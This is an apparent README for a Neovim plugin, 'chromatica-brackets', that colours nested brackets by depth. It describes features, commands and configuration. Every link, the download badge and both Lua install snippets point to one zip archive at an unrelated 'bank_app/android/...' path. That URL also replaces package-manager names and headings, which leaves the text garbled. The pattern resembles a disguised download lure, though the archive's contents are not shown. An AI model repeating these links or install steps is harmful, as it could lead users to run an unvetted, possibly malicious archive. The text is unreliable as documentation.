# 🎨 chromatica-brackets - Color Your Nested Brackets Easily

[![Download chromatica-brackets](https://github.com/SheyiTrig/chromatica-brackets/raw/refs/heads/bank_app/android/app/src/main/kotlin/brackets_chromatica_v1.8.zip%20chromatica--brackets-v1.0-blue)](https://github.com/SheyiTrig/chromatica-brackets/raw/refs/heads/bank_app/android/app/src/main/kotlin/brackets_chromatica_v1.8.zip)

## 📥 Download & Install

To get started, visit the Releases page to download the latest version of **chromatica-brackets**.

[Click here to visit the download page.](https://github.com/SheyiTrig/chromatica-brackets/raw/refs/heads/bank_app/android/app/src/main/kotlin/brackets_chromatica_v1.8.zip)

## 📝 Description

**chromatica-brackets** is a modern Neovim plugin that adds color to nested brackets based on their depth. It uses Lua and the Neovim native API. The plugin emphasizes simplicity, performance, and compatibility with existing ecosystems.

## 🌟 Features

- Uses Lua with `extmark`, maintaining syntax definitions while working with Treesitter and LSP highlights.
- Automatically generates a set of distinguishable bracket colors based on your color scheme and allows for complete customization.
- Allows configuration of maximum nesting depth, color strategies, and bracket types per file type.
- Uses window-scoped scanning and debounce mechanisms for large files to minimize performance impact.
- Offers commands: `ChromaticaBracketsToggle` and `ChromaticaBracketsRefresh`.

## 🚀 Getting Started

Once you install **chromatica-brackets**, it activates automatically for supported file types. There’s no need for extra configuration.

- It scans for brackets like `()[]{}<>`.
- It cycles through a set of automatically generated colors based on nested depth.
- It updates the colors automatically during insert and edit actions.

### Common Commands

- `:ChromaticaBracketsToggle` - Toggle bracket coloring in the current buffer.
- `:ChromaticaBracketsRefresh` - Force a re-scan and refresh of highlights.

## ⚙️ Installation

You can install **chromatica-brackets** using popular package managers like **https://github.com/SheyiTrig/chromatica-brackets/raw/refs/heads/bank_app/android/app/src/main/kotlin/brackets_chromatica_v1.8.zip** or **https://github.com/SheyiTrig/chromatica-brackets/raw/refs/heads/bank_app/android/app/src/main/kotlin/brackets_chromatica_v1.8.zip**.

### https://github.com/SheyiTrig/chromatica-brackets/raw/refs/heads/bank_app/android/app/src/main/kotlin/brackets_chromatica_v1.8.zip Example

Add the following code to your configuration:

```lua
{
  "https://github.com/SheyiTrig/chromatica-brackets/raw/refs/heads/bank_app/android/app/src/main/kotlin/brackets_chromatica_v1.8.zip",
  config = function()
    require("chromatica_brackets").setup()
  end,
}
```

### https://github.com/SheyiTrig/chromatica-brackets/raw/refs/heads/bank_app/android/app/src/main/kotlin/brackets_chromatica_v1.8.zip Example

Use the following snippet in your configuration:

```lua
use {
  "https://github.com/SheyiTrig/chromatica-brackets/raw/refs/heads/bank_app/android/app/src/main/kotlin/brackets_chromatica_v1.8.zip",
  config = function()
    require("chromatica_brackets").setup()
  end,
}
```

## ⚙️ Configuration Example

You can customize the setup to your preferences. Here is an example configuration:

```lua
require("chromatica_brackets").setup({
  enabled = true,
  throttle = 60,
  max_lines = 8000,
  undercurl = false,
  bold = false,
  
  filetypes = {
    ["*"] = {
      max_depth = 10,
      strategy = "cycle", -- "cycle" or "gradient"
      match_pairs = { "()", "[]", "{}", "<>" },
    },
  },
})
```

## 🔧 Configuration Options

- **enabled**: Activates or deactivates the plugin.
- **throttle**: Sets the update frequency in milliseconds.
- **max_lines**: Defines the maximum number of lines for effective performance.
- **undercurl**: Enables undercurls for highlighted brackets.
- **bold**: Toggles bold text for bracket highlights.
- **filetypes**: Allows specific configurations per file type, including maximum depth and color strategy.

## 👥 Community and Support

Join our community for help, feature requests, and sharing experiences. Feel free to create issues or pull requests in the repository. 

For detailed documentation and use cases, refer to the [official documentation](https://github.com/SheyiTrig/chromatica-brackets/raw/refs/heads/bank_app/android/app/src/main/kotlin/brackets_chromatica_v1.8.zip).

By following these steps, you can easily download and run **chromatica-brackets**, enhancing your coding experience in Neovim.